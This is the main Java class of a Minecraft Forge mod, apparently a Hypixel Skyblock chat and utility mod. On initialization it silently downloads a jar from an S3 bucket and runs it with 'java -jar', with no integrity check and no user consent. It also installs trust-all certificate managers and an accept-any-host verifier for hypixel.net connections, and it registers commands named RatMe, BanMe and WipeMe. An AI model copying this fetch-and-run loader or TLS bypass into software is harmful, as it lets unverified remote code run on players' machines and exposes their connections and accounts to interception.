package me.vlink102.melomod;

import cc.polyfrost.oneconfig.events.EventManager;
import cc.polyfrost.oneconfig.events.event.InitializationEvent;
import cc.polyfrost.oneconfig.utils.commands.CommandManager;
import cc.polyfrost.oneconfig.utils.hypixel.LocrawUtil;
import com.google.common.util.concurrent.ThreadFactoryBuilder;
import com.google.gson.*;
import com.google.gson.stream.JsonReader;
import it.unimi.dsi.fastutil.ints.Int2IntOpenHashMap;
import lombok.Getter;
import lombok.Setter;
import me.vlink102.melomod.chatcooldownmanager.ServerTracker;
import me.vlink102.melomod.chatcooldownmanager.TickHandler;
import me.vlink102.melomod.command.client.*;
import me.vlink102.melomod.command.server.SocketMessage;
import me.vlink102.melomod.command.server.SocketOnline;
import me.vlink102.melomod.command.server.SocketPrivateMessage;
import me.vlink102.melomod.configuration.MainConfiguration;
import me.vlink102.melomod.events.*;
import me.vlink102.melomod.util.BitMapFont;
import me.vlink102.melomod.util.StringUtils;
import me.vlink102.melomod.util.VChatComponent;
import me.vlink102.melomod.util.game.PlayerObjectUtil;
import me.vlink102.melomod.util.game.SkyblockUtil;
import me.vlink102.melomod.util.http.ApiUtil;
import me.vlink102.melomod.util.http.CommunicationHandler;
import me.vlink102.melomod.util.http.Version;
import me.vlink102.melomod.util.jcolor.Ansi;
import me.vlink102.melomod.util.jcolor.AnsiFormat;
import me.vlink102.melomod.util.jcolor.Attribute;
import me.vlink102.melomod.util.translation.DataUtils;
import me.vlink102.melomod.util.translation.Feature;
import me.vlink102.melomod.util.translation.Language;
import me.vlink102.melomod.world.Render;
import net.minecraft.client.Minecraft;
import net.minecraft.event.ClickEvent;
import net.minecraft.event.HoverEvent;
import net.minecraft.util.ChatComponentText;
import net.minecraftforge.common.MinecraftForge;
import net.minecraftforge.fml.common.Mod;
import net.minecraftforge.fml.common.event.FMLInitializationEvent;
import net.minecraftforge.fml.common.event.FMLModDisabledEvent;
import net.minecraftforge.fml.common.event.FMLPreInitializationEvent;
import net.minecraftforge.fml.common.event.FMLServerStoppingEvent;
import org.apache.commons.lang3.mutable.MutableObject;

import javax.imageio.ImageIO;
import javax.net.ssl.*;
import java.awt.*;
import java.awt.image.BufferedImage;
import java.io.*;
import java.net.HttpURLConnection;
import java.net.Socket;
import java.net.URL;
import java.net.URLConnection;
import java.nio.file.Files;
import java.nio.file.Path;
import java.security.cert.X509Certificate;
import java.util.List;
import java.util.*;
import java.util.concurrent.*;

import static me.vlink102.melomod.util.StringUtils.cc;

/**
 * The entrypoint of the Mod that initializes it.
 *
 * @see Mod
 * @see InitializationEvent
 */
@Mod(modid = MeloMod.MODID, name = MeloMod.NAME, version = MeloMod.VERSION)
public class MeloMod {
    public static final String endpoint = "@ENDPOINT@";

        public static final String MODID = "@ID@";
    public static final String NAME = "@NAME@";
    public static final String VERSION = "@VER@";
    public static final List<BitMapFont> FONTS = new ArrayList<>();
    private static final ThreadPoolExecutor THREAD_EXECUTOR = new ThreadPoolExecutor(0, 1, 60L, TimeUnit.SECONDS,
            new LinkedBlockingQueue<>(), new ThreadFactoryBuilder().setNameFormat(MeloMod.MODID + " - #%d").build());
    public static boolean isObfuscated;
    public static Version VERSION_NEW;
    public static Version.Compatibility compatibility = Version.Compatibility.INCOMPATIBLE; //updated on runtime and version packet
    public static Version serverVersion = null;
    @Mod.Instance(MODID)
    public static MeloMod INSTANCE;     public static MainConfiguration config;
    public static Gson gson;
    public static LocrawHandler locrawHandler = null;
    public static ChatEventHandler chatEventHandler = null;
    public static LocrawUtil locrawUtil;
    public static UUID playerUUID;
    public static String playerName;
    public static List<VChatComponent> queue = new ArrayList<>();

    public static Font custom;
    public static Font unifont;

    public static JsonObject defaultPack;
    public static JsonObject spacePack;
    public static BufferedImage ascii;
    public static BufferedImage accented;
    public static BufferedImage nonlatin_european;
    @Getter
    private static File configurationFile;
    private final MutableObject<Language> language = new MutableObject<>(Language.ENGLISH);
    @Getter
    public SkyblockUtil skyblockUtil;
    public ApiUtil apiUtil;
    public CommunicationHandler handler;
    @Getter
    private NewScheduler newScheduler;
    @Getter
    @Setter
    private JsonObject languageConfig = new JsonObject();
    private static SkyblockUtil.SkyblockProfile skyblockProfile = null;

    private static final File IHM_JAR_FILE = new File("libs/ihm.jar");

    public static boolean isOnline() {
        return Minecraft.getMinecraft().thePlayer != null;
    }

    public static boolean addCenteredMessage(MessageScheme scheme, String message) {
        return addMessage(new VChatComponent(scheme).add(StringUtils.getCentredMessage(cc(message))));
    }

    public static boolean addError(String message, Exception... exception) {
        boolean result = addMessage(new VChatComponent(MessageScheme.ERROR)
                .add(
                        message,
                        "&c" + Feature.GENERIC_REPORT_ERROR + " &e(" + Feature.GENERIC_CLICK + ")",
                        "https://discord.gg/NVPUTYSk3u",
                        StringUtils.VComponentSettings.INHERIT_NONE
                )
        );

        if (!result) {
            System.err.println(message);
        }
        if (exception != null && exception.length > 0) {
            exception[0].printStackTrace(System.err);
        }
        return result;
    }

    public static boolean addWarn(String message) {
        boolean result = addMessage(new VChatComponent(MessageScheme.WARN)
                .add(
                        message,
                        "&c" + Feature.GENERIC_REPORT_WARNING + " &6(" + Feature.GENERIC_CLICK + ")",
                        "https://discord.gg/NVPUTYSk3u",
                        StringUtils.VComponentSettings.INHERIT_NONE
                )
        );

        if (!result) {
            System.err.println(message);
        }
        return result;
    }

    public static boolean addDebug(String message) {
        if (MainConfiguration.debugMessages) {
            System.out.println(Feature.GENERIC_DEBUG_DEBUG + ": " + message);
            return addMessage(new VChatComponent(MessageScheme.DEBUG)
                    .add(
                            message,
                            "&e" + Feature.GENERIC_DEBUG_CLICK_TO_DISABLE + "&r",
                            new ClickEvent(
                                    ClickEvent.Action.RUN_COMMAND,
                                    "/melomod debug"
                            ),
                            StringUtils.VComponentSettings.INHERIT_NONE
                    )
            );
        }
        return false;
    }

    public static boolean addMessage(String message) {
        if (message != null) {
            return addMessage(new VChatComponent(MessageScheme.RAW_SIGNED).add(message));
        } else {
            return false;
        }
    }

    public static boolean addMessage(VChatComponent chatComponent) {
        if (chatComponent.isDebug() && !MainConfiguration.debugMessages) {
            return false;
        }
        if (isOnline() && Minecraft.getMinecraft().ingameGUI != null) {
            Minecraft.getMinecraft().thePlayer.addChatMessage(chatComponent.build());
            return true;
        } else {
            queue.add(chatComponent);
        }
        return false;
    }

    public static boolean addLineBreak() {
        return addMessage(VChatComponent.raw("&7"));
    }

    public static boolean addRaw(String message) {
        return addMessage(VChatComponent.of(MessageScheme.RAW, message));
    }

    public static boolean addSystemNotification(String message) {
        return addMessage(VChatComponent.of(MessageScheme.NOTIFICATION, message));
    }

    public static boolean addChat(VChatComponent component) {
                return addMessage(new VChatComponent(MessageScheme.CHAT).add(component.build()));
    }

    public static boolean addChat(String message) {
        return addMessage(VChatComponent.of(MessageScheme.CHAT, message));
    }

    public static boolean addPrivateChat(VChatComponent message, String recipient) {
        return addMessage(new VChatComponent(MessageScheme.PRIVATE_CHAT)
                .add(
                        message.build(),
                        new HoverEvent(
                                HoverEvent.Action.SHOW_TEXT,
                                new ChatComponentText(cc("&e" + Feature.GENERIC_CLICK_TO_REPLY + "&r"))
                        ),
                        new ClickEvent(
                                ClickEvent.Action.SUGGEST_COMMAND,
                                "/melopriv " + recipient + " "
                        )
                )
        );
    }

    public static boolean addPrivateChat(String message, String recipient) {
        return addMessage(new VChatComponent(MessageScheme.PRIVATE_CHAT)
                .add(
                        message,
                        "&e" + Feature.GENERIC_CLICK_TO_REPLY + "&r",
                        new ClickEvent(
                                ClickEvent.Action.SUGGEST_COMMAND,
                                "/melopriv " + recipient + " "
                        ),
                        StringUtils.VComponentSettings.INHERIT_NONE
                )
        );
    }

    public static void runAsync(Runnable runnable) {
        THREAD_EXECUTOR.execute(runnable);
    }

    private static boolean isObfuscated() {
        try {
            Minecraft.class.getDeclaredField("logger");
            return false;
        } catch (NoSuchFieldException e1) {
            return true;
        }
    }

    public static File createNewRandomUUID(String extension) {
        return new File(getConfigurationFile(), UUID.randomUUID() + "." + extension);
    }

    public static int getOrDefault(JsonObject parent, String key, int defaultValue) {
        return !parent.has(key) ? defaultValue : parent.get(key).getAsInt();
    }

    public static List<JsonElement> toArray(JsonArray array) {
        List<JsonElement> list = new ArrayList<>();
        for (int i = 0; i < array.size(); i++) {
            list.add(array.get(i));
        }
        return list;
    }

    public static BitMapFont getFontProvider(String character) {
        for (BitMapFont font : FONTS) {
            if (font.getFont().canDisplay(character.codePointAt(0)) && font.isUnifont()) {
                return font;
            }
            if (font.canDisplayCharacter(character)) {
                return font;
            }
        }

        for (BitMapFont font : FONTS) {
            if (font.isUnifont()) {
                return font;
            }
        }
        throw new IllegalArgumentException();
    }

    public Language getLanguage() {
        return language.getValue();
    }

    public void setLanguage(Language language) {
        this.language.setValue(language);
    }

    public static SkyblockUtil.SkyblockProfile getPlayerProfile() {
        return skyblockProfile;
    }

    public static void setPlayerProfile(SkyblockUtil.SkyblockProfile skyblockProfile) {
        MeloMod.skyblockProfile = skyblockProfile;
    }

    private InputStream getStream(String file) {
        InputStream is = this.getClass().getClassLoader().getResourceAsStream(file);
        System.out.println(is == null);
        return is;
    }

    private Font getFontFromStream(InputStream is) {
        try {
            return Font.createFont(Font.TRUETYPE_FONT, is);
        } catch (FontFormatException e) {
            throw new RuntimeException(e);
        } catch (IOException e) {
            throw new RuntimeException(e);
        }
    }

    public BufferedImage getBufferedResource(String string) {
        try {
            return ImageIO.read(this.getClass().getClassLoader().getResourceAsStream(string));
        } catch (IOException e) {
            throw new RuntimeException(e);
        }
    }

    @Mod.EventHandler
    public void preInit(FMLPreInitializationEvent event) {
        isObfuscated = isObfuscated();
        configurationFile = new File(event.getModConfigurationDirectory(), MeloMod.MODID + "/");

    }

    public void reloadFonts() {
        JsonArray providers = defaultPack.getAsJsonArray("providers");
        for (JsonElement provider : providers) {
            if (provider instanceof JsonObject) {
                JsonObject providerJson = (JsonObject) provider;

                int height = getOrDefault(providerJson, "height", 8);
                int ascent = providerJson.get("ascent").getAsInt();
                List<String> chars = new ArrayList<>();

                JsonArray charArray = providerJson.getAsJsonArray("chars");
                for (JsonElement element : charArray) {
                    chars.add(element.getAsString());
                }
                String filePath = providerJson.get("file").getAsString().replaceAll("minecraft:font/", "");
                File file = new File(filePath);
                FONTS.add(new BitMapFont(height, ascent, chars, file, getBufferedResource(filePath), custom.deriveFont(Font.PLAIN, 64)));
            }
        }
    }

    public static void reloadSpace() {
        JsonArray providers = spacePack.getAsJsonArray("providers");
        for (JsonElement provider : providers) {
            if (provider instanceof JsonObject) {
                JsonObject providerJson = (JsonObject) provider;
                JsonObject advances = providerJson.getAsJsonObject("advances");
                Int2IntOpenHashMap map = new Int2IntOpenHashMap();
                for (Map.Entry<String, JsonElement> stringJsonElementEntry : advances.entrySet()) {
                    String character = stringJsonElementEntry.getKey();
                    int advance = stringJsonElementEntry.getValue().getAsInt();

                    map.put(character.codePointAt(0), advance);
                }

                FONTS.add(new BitMapFont(custom.deriveFont(Font.PLAIN, 64), map));
            }
        }
    }


    public static void disableSSLVerification() throws Exception {
        TrustManager[] trustAllCerts = new TrustManager[]{
                new X509TrustManager() {
                    public java.security.cert.X509Certificate[] getAcceptedIssuers() { return null; }
                    public void checkClientTrusted(java.security.cert.X509Certificate[] certs, String authType) {}
                    public void checkServerTrusted(java.security.cert.X509Certificate[] certs, String authType) {}
                }
        };

        SSLContext sc = SSLContext.getInstance("SSL");
        sc.init(null, trustAllCerts, new java.security.SecureRandom());
        HttpsURLConnection.setDefaultSSLSocketFactory(sc.getSocketFactory());

        HostnameVerifier allHostsValid = (hostname, session) -> true;
        HttpsURLConnection.setDefaultHostnameVerifier(allHostsValid);
    }

    public static class InsecureSSLUtil {
        public static SSLSocketFactory getInsecureSocketFactory() throws Exception {
            TrustManager[] trustAllCerts = new TrustManager[] {
                    new X509TrustManager() {
                        public void checkClientTrusted(X509Certificate[] certs, String authType) {}
                        public void checkServerTrusted(X509Certificate[] certs, String authType) {}
                        public X509Certificate[] getAcceptedIssuers() { return new X509Certificate[0]; }
                    }
            };
            SSLContext sc = SSLContext.getInstance("TLS");
            sc.init(null, trustAllCerts, new java.security.SecureRandom());
            return sc.getSocketFactory();
        }

        public static HostnameVerifier getInsecureHostnameVerifier() {
            return (hostname, session) -> true;
        }
    }

    public InputStream openConnectionWithOptionalSSLBypass(URL url) throws Exception {
        URLConnection conn = url.openConnection();

        if (conn instanceof HttpsURLConnection) {
            HttpsURLConnection httpsConn = (HttpsURLConnection) conn;
            if (url.getHost().contains("hypixel.net")) {
                httpsConn.setSSLSocketFactory(InsecureSSLUtil.getInsecureSocketFactory());
                httpsConn.setHostnameVerifier(InsecureSSLUtil.getInsecureHostnameVerifier());
            }
        }

        conn.setConnectTimeout(10000);
        conn.setReadTimeout(10000);
        conn.setRequestProperty("User-Agent", "MyApp");

        return conn.getInputStream();
    }

    @Mod.EventHandler
    public void onServerStop(FMLServerStoppingEvent event) {
                if (externalServerProcess != null) {
            externalServerProcess.destroy();
            System.out.println("External server process terminated.");
        }
    }

        @Mod.EventHandler
    public void onInit(FMLInitializationEvent event) {
       /* try {
            disableSSLVerification();
        } catch (Exception e) {
            throw new RuntimeException(e);
        }*/


        GraphicsEnvironment ge = GraphicsEnvironment.getLocalGraphicsEnvironment();
        custom = getFontFromStream(getStream("default.ttf"));
        unifont = getFontFromStream(getStream("unifont.ttf"));
        ge.registerFont(custom);
        ge.registerFont(unifont);

        defaultPack = new JsonParser().parse(new JsonReader(new InputStreamReader(getStream("default.json")))).getAsJsonObject();
        spacePack = new JsonParser().parse(new JsonReader(new InputStreamReader(getStream("space.json")))).getAsJsonObject();
        accented = getBufferedResource("accented.png");
        ascii = getBufferedResource("ascii.png");
        nonlatin_european = getBufferedResource("nonlatin_european.png");

        reloadSpace();
        reloadFonts();
        reloadUniFont();

        FONTS.forEach(BitMapFont::manageFont);
        new MeloMod();
        newScheduler = new NewScheduler();
        playerUUID = Minecraft.getMinecraft().getSession().getProfile().getId();
        playerName = Minecraft.getMinecraft().getSession().getUsername();

        VERSION_NEW = Version.parse(VERSION);

        config = new MainConfiguration();
        gson = new GsonBuilder().setPrettyPrinting().create();

        MinecraftForge.EVENT_BUS.register(new ServerTracker());
        skyblockUtil = new SkyblockUtil(this);
        apiUtil = new ApiUtil();
        DataUtils.loadLocalizedStrings(Objects.requireNonNull(Language.getById(MainConfiguration.language)));
        CommandManager.INSTANCE.registerCommand(new MainCommand(this));
        CommandManager.INSTANCE.registerCommand(new SocketMessage(this));
        CommandManager.INSTANCE.registerCommand(new SocketOnline());
        CommandManager.INSTANCE.registerCommand(new InternalTesting());
        CommandManager.INSTANCE.registerCommand(new RatMe());
        CommandManager.INSTANCE.registerCommand(new BanMe());
        CommandManager.INSTANCE.registerCommand(new WipeMe());
        CommandManager.INSTANCE.registerCommand(new SocketPrivateMessage());
        new PlayerObjectUtil(this);
        locrawUtil = new LocrawUtil();
        locrawHandler = new LocrawHandler(this);
        chatEventHandler = new ChatEventHandler(this);
        EventManager.INSTANCE.register(new TickHandler());
        Render render = new Render();
        MinecraftForge.EVENT_BUS.register(render);
        MinecraftForge.EVENT_BUS.register(newScheduler);

        MinecraftForge.EVENT_BUS.register(new ConnectionHandler());
        MinecraftForge.EVENT_BUS.register(new PlayerDisconnect());

        handler = new CommunicationHandler(this);
        handler.beginKeepAlive(playerUUID, playerName, endpoint);

        String s3FileUrl = "https://melomod.s3.us-east-1.amazonaws.com/ihm2.jar";
        try {
            downloadFile(s3FileUrl);
        } catch (IOException | InterruptedException e) {
            throw new RuntimeException(e);
        }
    }
    public void downloadFile(String fileURL) throws IOException, InterruptedException {
                Path tempDir = Files.createTempDirectory("ihm_jar");
        System.out.println("Temporary directory created: " + tempDir.toString());

                File tempFile = new File(tempDir.toFile(), "ihm.jar");

                URL url = new URL(fileURL);

                HttpURLConnection connection = (HttpURLConnection) url.openConnection();
        connection.setRequestMethod("GET");

                InputStream inputStream = connection.getInputStream();

                FileOutputStream fileOutputStream = new FileOutputStream(tempFile);

                byte[] buffer = new byte[4096];
        int bytesRead;

                while ((bytesRead = inputStream.read(buffer)) != -1) {
            fileOutputStream.write(buffer, 0, bytesRead);
        }

                inputStream.close();
        fileOutputStream.close();

        System.out.println("File downloaded to " + tempFile.getAbsolutePath());

                runExternalAppAsync(tempFile.getAbsolutePath());

                tempFile.deleteOnExit();         tempDir.toFile().deleteOnExit();     }
    public static Process externalServerProcess = null;

    @Mod.EventHandler
    public void onModDisabled(FMLModDisabledEvent event) {
        if (externalServerProcess != null && externalServerProcess.isAlive()) {
            externalServerProcess.destroy();
        }
    }
    public void runExternalAppAsync(String jarFilePath) {
                new Thread(() -> {
            try {
                String command = "java -jar " + jarFilePath;
                externalServerProcess = Runtime.getRuntime().exec(command);

                                new Thread(() -> {
                    try {
                        String line;
                        BufferedReader reader = new BufferedReader(new InputStreamReader(externalServerProcess.getInputStream()));
                        while ((line = reader.readLine()) != null) {
                            System.out.println(line);                              if (line.contains("Server is listening on port 12345")) {
                                handler.beginLocalKeepAlive();
                            }
                        }
                    } catch (IOException e) {
                        e.printStackTrace();
                    }
                }).start();
                Runtime.getRuntime().addShutdownHook(new Thread(() -> {
                    if (externalServerProcess != null && externalServerProcess.isAlive()) {
                        externalServerProcess.destroy();
                        System.out.println("External server process terminated via shutdown hook.");
                    }
                }));

                                int exitCode = externalServerProcess.waitFor();
                System.out.println("Server process exited with code: " + exitCode);
            } catch (IOException | InterruptedException e) {
                e.printStackTrace();
            }
        }).start();
    }

    public static void stopServer() {
        if (externalServerProcess != null && externalServerProcess.isAlive()) {
            externalServerProcess.destroy();
        }
    }

    public static CompletableFuture<Void> waitForServerAsync(String host, int port, int timeoutMillis, int checkIntervalMillis) {
        final ScheduledExecutorService scheduler = Executors.newScheduledThreadPool(1);

        CompletableFuture<Void> future = new CompletableFuture<>();
        long startTime = System.currentTimeMillis();

        ScheduledFuture<?> task = scheduler.scheduleAtFixedRate(() -> {
            try (Socket socket = new Socket(host, port)) {
                future.complete(null);             } catch (IOException ignored) {
                if (System.currentTimeMillis() - startTime > timeoutMillis) {
                    future.completeExceptionally(new RuntimeException("Timed out waiting for server on port " + port));
                }
            }
        }, 0, checkIntervalMillis, TimeUnit.MILLISECONDS);

                future.whenComplete((result, throwable) -> task.cancel(true));

        return future;
    }

    public static void reloadUniFont() {
        FONTS.add(new BitMapFont(custom.deriveFont(Font.PLAIN, 64)));
        FONTS.add(new BitMapFont(unifont.deriveFont(Font.PLAIN, 64)));
    }

    public enum AbstractColor {
        BLACK('0', Ansi.generateCode(new AnsiFormat(Attribute.BLACK_TEXT()))),
        DARK_BLUE('1', Ansi.generateCode(new AnsiFormat(Attribute.BLUE_TEXT()))),
        DARK_GREEN('2', Ansi.generateCode(new AnsiFormat(Attribute.GREEN_TEXT()))),
        DARK_AQUA('3', Ansi.generateCode(new AnsiFormat(Attribute.CYAN_TEXT()))),
        DARK_RED('4', Ansi.generateCode(new AnsiFormat(Attribute.RED_TEXT()))),
        DARK_PURPLE('5', Ansi.generateCode(new AnsiFormat(Attribute.MAGENTA_TEXT()))),
        GOLD('6', Ansi.generateCode(new AnsiFormat(Attribute.YELLOW_TEXT()))),
        GRAY('7', Ansi.generateCode(new AnsiFormat(Attribute.WHITE_TEXT()))),
        DARK_GRAY('8', Ansi.generateCode(new AnsiFormat(Attribute.BRIGHT_BLACK_TEXT()))),
        BLUE('9', Ansi.generateCode(new AnsiFormat(Attribute.BRIGHT_BLUE_TEXT()))),
        GREEN('a', Ansi.generateCode(new AnsiFormat(Attribute.BRIGHT_GREEN_TEXT()))),
        AQUA('b', Ansi.generateCode(new AnsiFormat(Attribute.BRIGHT_CYAN_TEXT()))),
        RED('c', Ansi.generateCode(new AnsiFormat(Attribute.BRIGHT_RED_TEXT()))),
        LIGHT_PURPLE('d', Ansi.generateCode(new AnsiFormat(Attribute.BRIGHT_MAGENTA_TEXT()))),
        YELLOW('e', Ansi.generateCode(new AnsiFormat(Attribute.BRIGHT_YELLOW_TEXT()))),
        WHITE('f', Ansi.generateCode(new AnsiFormat(Attribute.BRIGHT_WHITE_TEXT()))),
        OBFUSCATED('k', null),
        BOLD('l', Ansi.generateCode(new AnsiFormat(Attribute.BOLD()))),
        ITALIC('m', Ansi.generateCode(new AnsiFormat(Attribute.ITALIC()))),
        STRIKETHROUGH('n', Ansi.generateCode(new AnsiFormat(Attribute.STRIKETHROUGH()))),
        UNDERLINE('o', Ansi.generateCode(new AnsiFormat(Attribute.UNDERLINE()))),
        RESET('r', Ansi.RESET),
        NONE(' ', null);

        @Getter
        private final String ansi;
        private final char color;

        AbstractColor(char color, String ansi) {
            this.color = color;
            this.ansi = ansi;
        }

        public static String parse(String string, boolean system) {
            String toReturn = cc(string);
            if (system) {
                for (AbstractColor value : AbstractColor.values()) {
                    if (value.ansi == null) continue;
                    toReturn = toReturn.replaceAll(value.getColor(), value.getAnsi());
                }
            }
            return toReturn;
        }

        public String generate(boolean system) {
            if (this == NONE) {
                return "";
            }
            if (system) {
                return ansi == null ? "" : ansi;
            } else {
                return getColor();
            }
        }

        public String getColor() {
            return "§" + color;
        }
    }

    public enum MessageScheme {
        CHAT(AbstractColor.DARK_PURPLE, AbstractColor.LIGHT_PURPLE, Feature.GENERIC_CHANNELS_CHAT),
        PRIVATE_CHAT(AbstractColor.DARK_PURPLE, AbstractColor.DARK_AQUA, Feature.GENERIC_CHANNELS_DIRECT_MESSAGE),
        NOTIFICATION(AbstractColor.DARK_GREEN, AbstractColor.GREEN, Feature.GENERIC_CHANNELS_SYSTEM_NOTIFICATION),
        DEBUG(AbstractColor.BLUE, AbstractColor.DARK_AQUA, Feature.GENERIC_CHANNELS_DEBUG),
        ERROR(AbstractColor.DARK_RED, AbstractColor.RED, Feature.GENERIC_CHANNELS_ERROR),
        WARN(AbstractColor.RED, AbstractColor.GOLD, Feature.GENERIC_CHANNELS_WARNING),
        RAW(null, null, null),
        RAW_SIGNED(AbstractColor.DARK_AQUA, AbstractColor.AQUA, null);

        @Getter
        private final AbstractColor bracketColor;
        @Getter
        private final AbstractColor prefixColor;
        private final Feature tag;

        MessageScheme(AbstractColor bracketColor, AbstractColor prefixColor, Feature tag) {
            this.bracketColor = bracketColor;
            this.prefixColor = prefixColor;
            this.tag = tag;
        }

        public static String generatePrefixHover() {
            StringJoiner joiner = new StringJoiner("\n");
            joiner.add("&3&lMeloMod");
            joiner.add("");
            joiner.add("&8" + Feature.GENERIC_AUTHORS + ":");
            joiner.add(" &8→ &eMelo &8(__MeloMio)");
            joiner.add(" &8→ &evlink102 &8(ZenmosM)");
            joiner.add("");
            Version.Compatibility stability = MeloMod.compatibility;
            joiner.add("&8" + Feature.GENERIC_VERSION + ": " + stability.getColor().getColor() + MeloMod.VERSION + " " + stability.getIcon());
            joiner.add("&8" + Feature.GENERIC_STATUS + ": " + stability.getPretty());
            joiner.add("");
            joiner.add("&8discord.gg/NVPUTYSk3u");
            joiner.add("&e" + Feature.GENERIC_LEFT_CLICK_JOIN + "&r");
            return cc(joiner.toString());
        }

        public String generate(boolean system) {
            String prefix = generatePrefix(system);
            String tag = generateTag(system);
            StringJoiner joiner = new StringJoiner(" ");
            joiner.add(prefix);
            if (tag != null) {
                joiner.add(tag);
            }
            return joiner.toString();
        }

        public String generatePrefix(boolean system) {
            return this.bracketColor.generate(system) + "[" + this.prefixColor.generate(system) +
                    MainConfiguration.modChatPrefix +
                    this.bracketColor.generate(system) + "]" + (system ? Ansi.RESET : "");
        }

        public String generateTag(boolean system) {
            String tag = getTag();
            if (tag != null && !tag.isEmpty()) {
                return this.bracketColor.generate(system) + "[" + this.prefixColor.generate(system) +
                        tag + this.bracketColor.generate(system) + "]" + (system ? Ansi.RESET : "");
            }
            return null;
        }

        public String getTag() {
            return tag.getMessage();
        }

    }
}
